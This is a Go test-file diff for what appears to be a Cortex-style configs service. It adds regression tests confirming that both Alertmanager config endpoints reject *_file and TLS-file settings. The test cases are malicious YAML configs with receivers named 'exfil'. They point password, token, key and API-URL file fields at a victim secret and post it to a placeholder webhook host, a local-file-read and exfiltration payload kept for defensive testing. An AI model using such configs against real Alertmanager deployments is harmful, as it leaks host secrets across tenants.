@@ -375,6 +375,156 @@ func TestParseConfigFormat(t *testing.T) {
 	}
 }
 
+// amCfgFileBlocklistCases enumerates the Alertmanager *_file / TLS-file settings
+// that the pkg/alertmanager blocklist rejects on POST /api/v1/alerts. The
+// configs service must reject them identically on every write path it exposes
+// (POST /api/prom/configs/alertmanager and POST
+// /api/prom/configs/alertmanager/validate); otherwise a tenant can regain the
+// arbitrary local-file-read / secret-exfiltration primitive by routing their
+// malicious YAML through the legacy configs service feeding the configdb
+// alertstore backend. See the finding attached to this change for background.
+var amCfgFileBlocklistCases = []struct {
+	name        string
+	config      string
+	errContains string
+}{
+	{
+		name: "basic_auth password_file",
+		config: `
+        route:
+          receiver: exfil
+        receivers:
+        - name: exfil
+          webhook_configs:
+          - url: http://example.invalid/
+            http_config:
+              basic_auth:
+                username: x
+                password_file: /tmp/victim-secret`,
+		errContains: "password_file",
+	},
+	{
+		name: "bearer_token_file",
+		config: `
+        route:
+          receiver: exfil
+        receivers:
+        - name: exfil
+          webhook_configs:
+          - url: http://example.invalid/
+            http_config:
+              bearer_token_file: /tmp/victim-secret`,
+		errContains: "password_file",
+	},
+	{
+		name: "authorization credentials_file",
+		config: `
+        route:
+          receiver: exfil
+        receivers:
+        - name: exfil
+          webhook_configs:
+          - url: http://example.invalid/
+            http_config:
+              authorization:
+                type: Bearer
+                credentials_file: /tmp/victim-secret`,
+		errContains: "password_file",
+	},
+	{
+		name: "tls_config key_file",
+		config: `
+        route:
+          receiver: exfil
+        receivers:
+        - name: exfil
+          webhook_configs:
+          - url: http://example.invalid/
+            http_config:
+              tls_config:
+                key_file: /tmp/victim-secret`,
+		errContains: "TLS",
+	},
+	{
+		name: "global slack_api_url_file",
+		config: `
+        global:
+          slack_api_url_file: /tmp/victim-secret
+        route:
+          receiver: slack
+        receivers:
+        - name: slack
+          slack_configs:
+          - channel: '#x'`,
+		errContains: "slack_api_url_file",
+	},
+	{
+		name: "slack api_url_file",
+		config: `
+        route:
+          receiver: slack
+        receivers:
+        - name: slack
+          slack_configs:
+          - api_url_file: /tmp/victim-secret
+            channel: '#x'`,
+		errContains: "slack_api_url_file",
+	},
+	{
+		name: "victorops api_key_file",
+		config: `
+        route:
+          receiver: vo
+        receivers:
+        - name: vo
+          victorops_configs:
+          - api_key_file: /tmp/victim-secret
+            routing_key: foo`,
+		errContains: "VictorOps api_key_file",
+	},
+}
+
+// Test_SetConfig_RejectsFileBlocklist verifies POST /api/prom/configs/alertmanager
+// — the ingestion path that previously bypassed the Alertmanager *_file blocklist
+// (CWE-73) — now returns HTTP 400 for every *_file / TLS-file variant.
+func Test_SetConfig_RejectsFileBlocklist(t *testing.T) {
+	setup(t)
+	defer cleanup(t)
+
+	for _, tc := range amCfgFileBlocklistCases {
+		t.Run(tc.name, func(t *testing.T) {
+			userID := makeUserID()
+			cfg := userconfig.Config{
+				AlertmanagerConfig: tc.config,
+				RulesConfig:        userconfig.RulesConfig{FormatVersion: userconfig.RuleFormatV2},
+			}
+			resp := requestAsUser(t, userID, "POST", "/api/prom/configs/alertmanager", "", readerFromConfig(t, cfg))
+			assert.Equal(t, http.StatusBadRequest, resp.Code, "body: %s", resp.Body.String())
+			assert.Contains(t, resp.Body.String(), tc.errContains)
+		})
+	}
+}
+
+// Test_ValidateAlertmanagerConfig_RejectsFileBlocklist verifies that
+// POST /api/prom/configs/alertmanager/validate — which previously used the same
+// weak validator as setConfig — now rejects every *_file / TLS-file variant.
+func Test_ValidateAlertmanagerConfig_RejectsFileBlocklist(t *testing.T) {
+	setup(t)
+	defer cleanup(t)
+
+	for _, tc := range amCfgFileBlocklistCases {
+		t.Run(tc.name, func(t *testing.T) {
+			userID := makeUserID()
+			resp := requestAsUser(t, userID, "POST", "/api/prom/configs/alertmanager/validate", "", strings.NewReader(tc.config))
+			assert.Equal(t, http.StatusBadRequest, resp.Code, "body: %s", resp.Body.String())
+			data := map[string]string{}
+			require.NoError(t, json.Unmarshal(resp.Body.Bytes(), &data))
+			assert.Equal(t, "error", data["status"])
+			assert.Contains(t, data["error"], tc.errContains)
+		})
+	}
+}
+
 func Test_SetConfig_ValidateTemplateFiles(t *testing.T) {
 	cfg := userconfig.Config{
 		TemplateFiles: map[string]string{
